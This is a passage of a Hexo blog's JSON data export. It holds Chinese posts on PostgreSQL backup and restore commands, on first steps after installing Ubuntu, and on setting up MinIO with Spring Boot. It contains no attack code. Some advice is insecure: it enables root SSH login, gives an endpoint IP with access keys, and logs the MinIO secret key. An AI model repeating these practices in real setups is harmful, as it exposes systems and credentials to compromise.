+\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -s -cC -Fc -b -E UTF8 -d 数据库名\n```\n\n> 备份某个架构的所有视图\n\n```shell\n pg_dump -p 端口 -U 登录用户名 --no-password -v -cC -t 架构.view_\"*\" -t 架构.casesearchproject -d 数据库名 > view_all-$(date +\"%y%m%d\").sql\n```\n\n### 数据导入\n\n恢复某个架构包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp --role=角色名 -n 架构名\n```\n\n恢复某个架构不包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp -s --role=角色名 -n 架构名\n```\n\n恢复整个数据库包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp\n```\n恢复整个数据库不包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -s -v xxx-$(date +\"%y%m%d\").dmp\n```\n\n恢复某个架构的所有视图\n```shell\npsql -p 端口 -d 数据库名 -v -f view_all-$(date +\"%y%m%d\").sql\n```\n\n\n","slug":"PostgreSql操作","published":1,"updated":"2023-03-10T02:53:32.070Z","_id":"cleqw6ccv00003gvggkpjd8nt","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"PostgreSql\"><a href=\"#PostgreSql\" class=\"headerlink\" title=\"PostgreSql\"></a>PostgreSql</h2><h3 id=\"创建表空间\"><a href=\"#创建表空间\" class=\"headerlink\" title=\"创建表空间\"></a>创建表空间</h3><p>创建本地表空间存放目录</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mkdir -pv &#x2F;home&#x2F;pgsql13&#x2F;postgresql&#x2F;pgdata&#x2F;dir1\nchown -R postgres:postgres &#x2F;home&#x2F;pgsql13&#x2F;postgresql&#x2F;pgdata<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>创建表空间</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">create tablespace 表空间名 owner postgres location <span class=\"token string\">'表空间本地目录'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"创建数据库\"><a href=\"#创建数据库\" class=\"headerlink\" title=\"创建数据库\"></a>创建数据库</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">CREATE DATABASE 数据库名字 WITH OWNER <span class=\"token operator\">=</span> postgres ENCODING <span class=\"token operator\">=</span> <span class=\"token string\">'UTF8'</span> LC_COLLATE <span class=\"token operator\">=</span> <span class=\"token string\">'zh_CN.UTF-8'</span> LC_CTYPE <span class=\"token operator\">=</span> <span class=\"token string\">'zh_CN.UTF-8'</span> TABLESPACE <span class=\"token operator\">=</span> 表空间名 CONNECTION LIMIT <span class=\"token operator\">=</span> -1<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"用户角色创建\"><a href=\"#用户角色创建\" class=\"headerlink\" title=\"用户角色创建\"></a>用户角色创建</h3><p>角色即用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">CREATE ROLE 角色名 WITH LOGIN SUPERUSER NOCREATEDB CREATEROLE INHERIT NOREPLICATION CONNECTION LIMIT <span class=\"token parameter variable\">-1</span> PASSWORD <span class=\"token string\">'密码'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"架构模式创建\"><a href=\"#架构模式创建\" class=\"headerlink\" title=\"架构模式创建\"></a>架构模式创建</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 删除自动生成的默认架构即模式</span>\ndrop schema public cascade<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 每行会创建一个架构即模式 一般角色名和架构名字一样</span>\nCREATE SCHEMA 架构名 AUTHORIZATION 角色名<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 每行授权一个架构即模式</span>\nGRANT ALL ON SCHEMA 角色名 TO 结构名 WITH GRANT OPTION<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据导出\"><a href=\"#数据导出\" class=\"headerlink\" title=\"数据导出\"></a>数据导出</h3><blockquote>\n<p>备份某个库下面的某个架构的数据包括架构，并指定了用户角色</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色 <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-n</span> 架构 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份整个库的数据包括架构</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份整个库的架构不包括数据</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份某个架构的所有视图</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-t</span> 架构.view_<span class=\"token string\">\"*\"</span> <span class=\"token parameter variable\">-t</span> 架构.casesearchproject <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token operator\">></span> view_all-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"数据导入\"><a href=\"#数据导入\" class=\"headerlink\" title=\"数据导入\"></a>数据导入</h3><p>恢复某个架构包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色名 <span class=\"token parameter variable\">-n</span> 架构名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复某个架构不包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色名 <span class=\"token parameter variable\">-n</span> 架构名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复整个数据库包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>恢复整个数据库不包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复某个架构的所有视图</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-f</span> view_all-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"PostgreSql\"><a href=\"#PostgreSql\" class=\"headerlink\" title=\"PostgreSql\"></a>PostgreSql</h2><h3 id=\"创建表空间\"><a href=\"#创建表空间\" class=\"headerlink\" title=\"创建表空间\"></a>创建表空间</h3><p>创建本地表空间存放目录</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mkdir -pv &#x2F;home&#x2F;pgsql13&#x2F;postgresql&#x2F;pgdata&#x2F;dir1\nchown -R postgres:postgres &#x2F;home&#x2F;pgsql13&#x2F;postgresql&#x2F;pgdata<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>创建表空间</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">create tablespace 表空间名 owner postgres location <span class=\"token string\">'表空间本地目录'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"创建数据库\"><a href=\"#创建数据库\" class=\"headerlink\" title=\"创建数据库\"></a>创建数据库</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">CREATE DATABASE 数据库名字 WITH OWNER <span class=\"token operator\">=</span> postgres ENCODING <span class=\"token operator\">=</span> <span class=\"token string\">'UTF8'</span> LC_COLLATE <span class=\"token operator\">=</span> <span class=\"token string\">'zh_CN.UTF-8'</span> LC_CTYPE <span class=\"token operator\">=</span> <span class=\"token string\">'zh_CN.UTF-8'</span> TABLESPACE <span class=\"token operator\">=</span> 表空间名 CONNECTION LIMIT <span class=\"token operator\">=</span> -1<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"用户角色创建\"><a href=\"#用户角色创建\" class=\"headerlink\" title=\"用户角色创建\"></a>用户角色创建</h3><p>角色即用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">CREATE ROLE 角色名 WITH LOGIN SUPERUSER NOCREATEDB CREATEROLE INHERIT NOREPLICATION CONNECTION LIMIT <span class=\"token parameter variable\">-1</span> PASSWORD <span class=\"token string\">'密码'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"架构模式创建\"><a href=\"#架构模式创建\" class=\"headerlink\" title=\"架构模式创建\"></a>架构模式创建</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 删除自动生成的默认架构即模式</span>\ndrop schema public cascade<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 每行会创建一个架构即模式 一般角色名和架构名字一样</span>\nCREATE SCHEMA 架构名 AUTHORIZATION 角色名<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 每行授权一个架构即模式</span>\nGRANT ALL ON SCHEMA 角色名 TO 结构名 WITH GRANT OPTION<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据导出\"><a href=\"#数据导出\" class=\"headerlink\" title=\"数据导出\"></a>数据导出</h3><blockquote>\n<p>备份某个库下面的某个架构的数据包括架构，并指定了用户角色</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色 <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-n</span> 架构 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份整个库的数据包括架构</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份整个库的架构不包括数据</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-f</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-Fc</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-E</span> UTF8 <span class=\"token parameter variable\">-d</span> 数据库名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>备份某个架构的所有视图</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-U</span> 登录用户名 --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-t</span> 架构.view_<span class=\"token string\">\"*\"</span> <span class=\"token parameter variable\">-t</span> 架构.casesearchproject <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token operator\">></span> view_all-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"数据导入\"><a href=\"#数据导入\" class=\"headerlink\" title=\"数据导入\"></a>数据导入</h3><p>恢复某个架构包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色名 <span class=\"token parameter variable\">-n</span> 架构名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复某个架构不包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">--role</span><span class=\"token operator\">=</span>角色名 <span class=\"token parameter variable\">-n</span> 架构名<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复整个数据库包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>恢复整个数据库不包括数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_restore <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-O</span> <span class=\"token parameter variable\">-x</span> <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-v</span> xxx-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.dmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>恢复某个架构的所有视图</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-d</span> 数据库名 <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-f</span> view_all-<span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">date</span> +<span class=\"token string\">\"%y%m%d\"</span><span class=\"token variable\">)</span></span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n"},{"title":"ubuntu安装后第一步","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-09T09:34:19.000Z","password":null,"summary":"ubuntu安装后第一步","_content":"\n\n\n\n`无法解析域名cn.archive.ubuntu.com`\n\n```\nsudo service network-manager stop\n```\n\n```\nsudo rm /var/lib/NetworkManager/NetworkManager.state\n```\n\n```\nsudo service network-manager start\n```\n\n```\nsudo apt-get install yum\n```\n\n```\nsudo yum install vim\n```\n\n`Ubuntu下服务器开启远程连接`\n\n```\nsudo apt install openssh-server\n```\n\n```\nservice sshd status\n```\n\n`Ubuntu系统使用root远程登录`\n\n```\nsudo passwd root\n```\n\n\n`vim /etc/ssh/sshd_config`\n```\nPermitRootLogin yes\n```\n\n","source":"_posts/ubuntu安装后第一步.md","raw":"---\ntitle: ubuntu安装后第一步\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-09 17:34:19\npassword:\nsummary: ubuntu安装后第一步\ntags: os\ncategories: ubuntu\n---\n\n\n\n\n`无法解析域名cn.archive.ubuntu.com`\n\n```\nsudo service network-manager stop\n```\n\n```\nsudo rm /var/lib/NetworkManager/NetworkManager.state\n```\n\n```\nsudo service network-manager start\n```\n\n```\nsudo apt-get install yum\n```\n\n```\nsudo yum install vim\n```\n\n`Ubuntu下服务器开启远程连接`\n\n```\nsudo apt install openssh-server\n```\n\n```\nservice sshd status\n```\n\n`Ubuntu系统使用root远程登录`\n\n```\nsudo passwd root\n```\n\n\n`vim /etc/ssh/sshd_config`\n```\nPermitRootLogin yes\n```\n\n","slug":"ubuntu安装后第一步","published":1,"updated":"2023-03-10T03:04:10.068Z","_id":"clf0wz5uu0000pgvg8azb09co","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>无法解析域名cn.archive.ubuntu.com</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo service network-manager stop<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo rm &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo service network-manager start<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt-get install yum<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo yum install vim<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>Ubuntu下服务器开启远程连接</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt install openssh-server<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">service sshd status<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>Ubuntu系统使用root远程登录</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo passwd root<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n<p><code>vim /etc/ssh/sshd_config</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">PermitRootLogin yes<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<p><code>无法解析域名cn.archive.ubuntu.com</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo service network-manager stop<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo rm &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo service network-manager start<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt-get install yum<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo yum install vim<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>Ubuntu下服务器开启远程连接</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo apt install openssh-server<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">service sshd status<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>Ubuntu系统使用root远程登录</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo passwd root<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n<p><code>vim /etc/ssh/sshd_config</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">PermitRootLogin yes<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n"},{"title":"MinIO的搭建与SpringBoot的整合","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-09T09:33:10.000Z","password":null,"summary":"MinIO的搭建与SpringBoot的整合","_content":"\n\n\n# MinIO的搭建（单机部署）\n\n## 二进制方式：\n\n```\nmkdir /mnt/data\n```\n\n```\nsudo chmod -R 775 /mnt/data\n```\n\n```\nwget -P /mnt/data/ https://dl.min.io/server/minio/release/linux-amd64/minio\n```\n\n 将下载的文件变成可执行\n\n```\nchmod +x /mnt/data/minio\n```\n\n启动：         (不设置密码就是默认 minioadmin/minioadmin)\n\n```\n/mnt/data/minio server /mnt/data\n```\n\n后台指定9000端口启动：\n\n```\nnohup /mnt/data/minio server  --address :9000 --console-address :9001 /mnt/data/ > /mnt/data/minio.log &\n```\n\n## docker方式：\n\n```\ndocker run -d \\\n  -p 8900:9000 \\\n  -p 8901:9001 \\\n  --name minio2 \\\n  -v ~/var/local/environment/data:/data \\\n  -e \"MINIO_ROOT_USER=root\" \\\n  -e \"MINIO_ROOT_PASSWORD=minio123456\" \\\n  minio/minio server /data --console-address \":8901\"\n```\n\n# spring boot的整合\n\npom加入minio依赖\n\n```\n <dependency>\n      <groupId>io.minio</groupId>\n      <artifactId>minio</artifactId>\n      <version>8.4.5</version>\n</dependency>\n \n<dependency>\n    <groupId>com.squareup.okhttp3</groupId>\n    <artifactId>okhttp</artifactId>\n    <version>4.10.0</version>\n</dependency>\n```\n\nyml文件加入配置\n\n```\nminio:\n  endpoint: http:/81.68.119.53/:9000\n  accessKey: masterminio\n  secretKey: masterminio\n  bucketName: wmy\n```\n\n后端代码编写\n\n```\n@Configuration\n@Slf4j\npublic class MinioClientConfig {\n \n    @Value(\"${minio.endpoint}\")\n    private String endpoint;\n \n    @Value(\"${minio.accessKey}\")\n    private String accessKey;\n \n    @Value(\"${minio.secretKey}\")\n    private String secretKey;\n \n    @Value(\"${minio.bucketName}\")\n    private String bucketName;\n \n    @Bean\n    public MinioClient minioClient() {\n        log.info(\"endpoint={}  ,  accessKey={}  ,secretKey={}\", endpoint, accessKey, secretKey);\n        return MinioClient.builder().credentials(accessKey, secretKey).endpoint(endpoint).build();\n    }\n}\n```\n\n上传文件工具类\n\n```\n@Component\npublic class MinioUtils {\n \n    @Autowired\n    private MinioClient minioClient;\n \n \n    /**\n     * 判断桶是否存在\n     */\n    @SneakyThrows(Exception.class)\n    public boolean bucketExists(String bucketName) {\n        return minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build());\n    }\n \n \n    /**\n     * 创建桶\n     * @param bucketName\n     * 获取全部的桶  minioClient.listBuckets();\n     */\n    @SneakyThrows(Exception.class)\n    public void createBucket(String bucketName) {\n        if (!minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build())) {\n            minioClient.makeBucket(MakeBucketArgs.builder().bucket(bucketName).build());\n        }\n    }\n \n \n    /**\n     * 根据bucketName获取信息\n     * @param bucketName bucket名称\n     */\n    @SneakyThrows(Exception.class)\n    public Optional<Bucket> getBucket(String bucketName) {\n        return minioClient.listBuckets().stream().filter(b -> 